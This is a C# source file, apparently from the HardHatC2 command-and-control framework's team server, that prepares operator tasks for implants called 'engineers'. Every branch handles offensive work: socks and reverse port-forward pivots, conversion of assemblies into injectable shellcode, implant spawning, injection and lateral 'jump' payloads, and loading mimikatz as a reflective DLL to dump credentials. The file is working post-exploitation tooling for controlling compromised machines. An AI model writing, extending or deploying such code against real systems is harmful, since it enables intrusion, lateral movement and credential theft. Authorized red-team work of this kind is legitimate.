﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using TeamServer.Models;
using TeamServer.Models.Extras;
using TeamServer.Services;

namespace TeamServer.Utilities
{
    public class TaskPreProcess
    {
        public static List<string> CommandsThatNeedPreProc = new List<string> { "shellcode", "inlineAssembly", "loadassembly", "sleep", "powershell_import", "upload", "spawn", "inject", "jump", "inlinedll", "mimikatz","socks","rportforward","executeassembly"};

        public static async Task PreProcessTask(EngineerTask currentTask, Engineer engineer)
        {

            //if command is proxy call the Socks4Proxy class to make a proxy
            if (currentTask.Command == "socks")
            {
                if (!currentTask.Arguments.TryGetValue("/port", out string port))
                {
                    port = "1080";
                }
                port = port.TrimStart(' ');
                HttpmanagerController.Proxy = new Socks4Proxy(bindPort: int.Parse(port)); // gives the user supplied value as the port to start the socks server on :) 

                //call proxy.Start() but dont block execution 
                Task.Run(() => HttpmanagerController.Proxy.Start(engineer));
                //Console.WriteLine("Socks proxy started on port " + port);
                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server started on {port}", Status = "success" });
                await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = engineer.engineerMetadata.Id, BindPort = port, FwdHost = engineer.engineerMetadata.Address, FwdPort ="*", pivotType = PivotProxy.PivotProxyType.SOCKS4a, pivotDirection = PivotProxy.ProxyDirection.Bind});
                //if /stop is in the arguments, stop the proxy
                if (currentTask.Arguments.ContainsKey("/stop"))
                {
                    HttpmanagerController.Proxy.Stop();
                    await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server on {port} stopped", Status = "info" });
                }
            }

            else if(currentTask.Command == "rportforward")
            {
                currentTask.Arguments.TryGetValue("/fwdport", out string fwdport);
                currentTask.Arguments.TryGetValue("/fwdhost", out string fwdaddress);
                currentTask.Arguments.TryGetValue("/bindport", out string bindPort);
                //make a new guid for this client to have a unique id
                string clientid = Guid.NewGuid().ToString();
                fwdaddress = fwdaddress.TrimStart(' ');
                fwdport =  fwdport.TrimStart(' ');
                bindPort = bindPort.TrimStart(' ');
                currentTask.Arguments.TryAdd("/client", clientid);
                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"rport forward tasked to start targeting {fwdaddress}:{fwdport}", Status = "success" });
                Task.Run(async() => (RPortForward.rPortStart(fwdaddress, int.Parse(fwdport), clientid, engineer)));
                await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = engineer.engineerMetadata.Id, FwdHost = fwdaddress, FwdPort = fwdport, BindPort = bindPort, pivotType = PivotProxy.PivotProxyType.R_PORT_FWD, pivotDirection = PivotProxy.ProxyDirection.Reverse });
            }

            // if the most recent engineerTask in taskList Command is shellcode, invoke the Shellcode.AssemToShellcode function, pass in the task.Arguments[0] and task.Arguments[1]
            else if (currentTask.Command == "shellcode")
            {
                //split the arguments into two strings at the first space
                currentTask.Arguments.TryGetValue("/program", out string program);
                currentTask.Arguments.TryGetValue("/args", out string arguments);
                var shellcode = Shellcode.AssemToShellcode(program, arguments);
                currentTask.File = shellcode;
            }

            //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
            else if (currentTask.Command == "inlineAssembly")
            {
                currentTask.Arguments.TryGetValue("/file", out string filepath);
                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;
            }
            else if (currentTask.Command.Equals("executeAssembly",StringComparison.CurrentCultureIgnoreCase))
            {
                //split the arguments into two strings at the first space
                currentTask.Arguments.TryGetValue("/file", out string program);
                currentTask.Arguments.TryGetValue("/args", out string arguments);
                var shellcode = Shellcode.AssemToShellcode(program, arguments);
                currentTask.File = shellcode;
            }

            //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
            else if (currentTask.Command == "loadassembly")
            {
                currentTask.Arguments.TryGetValue("/file", out string filepath);
                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;
            }

            // if command is sleep then update the engineer sleep value to the argument[0]
            else if (currentTask.Command == "sleep")
            {
                currentTask.Arguments.TryGetValue("/time", out string sleep);
                engineer.Sleep = int.Parse(sleep);
                engineer.engineerMetadata.Sleep = int.Parse(sleep);
            }

            //if command is powershell_import read file at /import and turn it into a base64 string and add it to the task.Arguments dictionary with the key /script
            else if (currentTask.Command == "powershell_import")
            {
                currentTask.Arguments.TryGetValue("/import", out string filepath);
                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;
            }

            //if command is uplaod read file at /file and turn it into a base64 string and add it to the task.Arguments dictionary with the key /content
            else if (currentTask.Command == "upload")
            {
                currentTask.Arguments.TryGetValue("/file", out string filepath);
                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;
            }

            //if command is spawn call donut to make shellcode out of engineer 
            else if (currentTask.Command == "spawn")
            {
                //split the arguments into two strings at the first space
                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
                {
                    manager = engineer.engineerMetadata.ManagerName;
                }
                manager = manager.TrimStart(' ');
                string arguments = "";

                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                string filepath = Directory.GetFiles(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}", $"Engineer_{manager}_merged.exe").FirstOrDefault();

                var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
                //convert byte array into a base64 string
                currentTask.File = shellcode;
            }

            //if command is inject call donut to make shellcode out of engineer 
            else if (currentTask.Command == "inject")
            {
                //split the arguments into two strings at the first space
                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
                {
                    manager = engineer.engineerMetadata.ManagerName;
                }
                manager = manager.TrimStart(' ');
                string arguments = "";

                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                string filepath = Directory.GetFiles(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}", $"Engineer_{manager}_merged.exe").FirstOrDefault();

                var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
                //convert byte array into a base64 string
                currentTask.File = shellcode;
            }

            //if command is jump call donut to make shellcode out of engineer and assign it to a variable called binary
            else if (currentTask.Command == "jump")
            {
                //split the arguments into two strings at the first space
                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
                {
                    manager = engineer.engineerMetadata.ManagerName;
                }
                manager = manager.TrimStart(' ');
                string arguments = "";

                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                string filepath = Directory.GetFiles(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}", $"Engineer_{manager}_merged.exe").FirstOrDefault();

                //might change later but would need to update jump methods to use shellcode injection instead of writing a file to disk.

                //var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
                ////convert byte array into a base64 string
                //var shellcodeString = Convert.ToBase64String(shellcode);
                ////update the task to have the shellcode as an argument
                //currentTask.Arguments.Add("/binary", shellcodeString);

                //read the file at filepath and turn it into a base64 string and add it to the task.Arguments dictionary with the key /binary
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;

            }

            //if command is inlinedll take the /dll argument, read the file into a byte array, and convert that into a base64 string and replace the /dll value with this new string
            else if (currentTask.Command == "inlinedll")
            {
                currentTask.Arguments.TryGetValue("/dll", out string dllpath);
                dllpath = dllpath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(dllpath);
                Console.WriteLine($"got {fileContent.Length} dll bytes");
                currentTask.File = fileContent;
            }

            //if command is mimikatz go to the base directory of the project then the programs/builtin directory and find the powerkatz.dll file read it into a byte array and convert it to a base64 string and add it to the task.Arguments dictionary with the key /dll
            else if (currentTask.Command == "mimikatz")
            {
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                string filepath = Directory.GetFiles(pathSplit[0] + "programs" + $"{allPlatformPathSeperator}" + "builtin" + $"{allPlatformPathSeperator}", $"powerkatz.dll").FirstOrDefault();
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                currentTask.File = fileContent;

                currentTask.Arguments.Add("/function", "powershell_reflective_mimikatz");
                //update command name to inlinedll
                currentTask.Command = "inlinedll";
            }
        }
    }
}